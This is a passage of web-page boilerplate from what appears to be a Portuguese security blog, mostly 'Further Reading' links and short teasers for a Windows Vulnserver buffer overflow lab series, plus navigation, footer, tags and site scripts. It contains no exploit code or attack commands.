mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/std-winbof-1/"><div class="card-body"> <span class="timeago small" >Oct 6, 2021<i class="unloaded">2021-10-06T12:00:00-03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Windows Vulnserver Buffer Overflow - Parte 1 Objetivos e Análise do Código</h3><div class="text-muted small"><p> BUFFER OVERFLOW EM WINDOWS Neste laboratório, vamos explorar várias técnicas de buffer overflow no SO Windows, o intuito é de entender a mecânica por trás de aplicações e programas e encontrar uma...</p></div></div></a></div><div class="card"> <a href="/posts/std-winbof-3/"><div class="card-body"> <span class="timeago small" >Oct 6, 2021<i class="unloaded">2021-10-06T14:00:00-03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Windows Vulnserver Buffer Overflow - Parte 3 Saltos na Memória</h3><div class="text-muted small"><p> COMANDO GTER O comando GTER, assim como os demais, recebe um argumento e dá uma resposta. Neste comando, temos uma situação parecida com a anterior, porém encontramos uma problema com o espaço dis...</p></div></div></a></div><div class="card"> <a href="/posts/std-winbof-4/"><div class="card-body"> <span class="timeago small" >Oct 6, 2021<i class="unloaded">2021-10-06T15:00:00-03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Windows Vulnserver Buffer Overflow - Parte 4 Bypass do SEH</h3><div class="text-muted small"><p> COMANDO GMON O comando GMON, assim como os demais, recebe um argumento e dá uma resposta. Neste comando iremos explorar outa tecnica de exploração de buffer overflow em binários Windows. FUZZIN...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/std-winbof-1/" class="btn btn-outline-primary" prompt="Older"><p>Windows Vulnserver Buffer Overflow - Parte 1 Objetivos e Análise do Código</p></a> <a href="/posts/std-winbof-3/" class="btn btn-outline-primary" prompt="Newer"><p>Windows Vulnserver Buffer Overflow - Parte 3 Saltos na Memória</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2025 <a href="https://github.com/h41stur">H41stur</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/assembly/">Assembly</a> <a class="post-tag" href="/tags/binary-exploitation/">Binary Exploitation</a> <a class="post-tag" href="/tags/buffer-overflow/">Buffer Overflow</a> <a class="post-tag" href="/tags/web/">Web</a> <a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/vulnserver/">Vulnserver</a> <a class="post-tag" href="/tags/android/">Android</a> <a class="post-tag" href="/tags/kernel/">Kernel</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://h41stur.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script>
